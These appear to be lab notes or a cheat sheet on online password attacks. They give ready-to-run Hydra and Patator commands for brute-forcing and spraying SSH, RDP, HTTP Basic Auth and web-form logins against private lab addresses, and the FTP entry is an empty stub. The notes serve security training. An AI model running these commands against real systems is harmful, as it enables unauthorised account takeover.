
# SSH
```
sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```


# RDP
```
sudo hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```


# FTP
```
ftp://
```


# HTTP GET (Basic Auth)
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.242.201 http-head /
```
```
patator http_fuzz auth_type=basic url=http://192.168.157.46:242/ user=FILE0 password=FILE1 0=./users.txt 1=/usr/share/wordlists/rockyou.txt -x ignore:code=401
```


# HTTP POST
http-post-form argument, which accepts three colon-delimited fields.

The first field indicates the location of the login form. In this demonstration, the login form is located on the index.php web page. The second field specifies the request body used for providing a username and password to the login form, which we retrieved with Burp. Finally we must provide the failed login identifier, also known as a condition string.

```
sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```
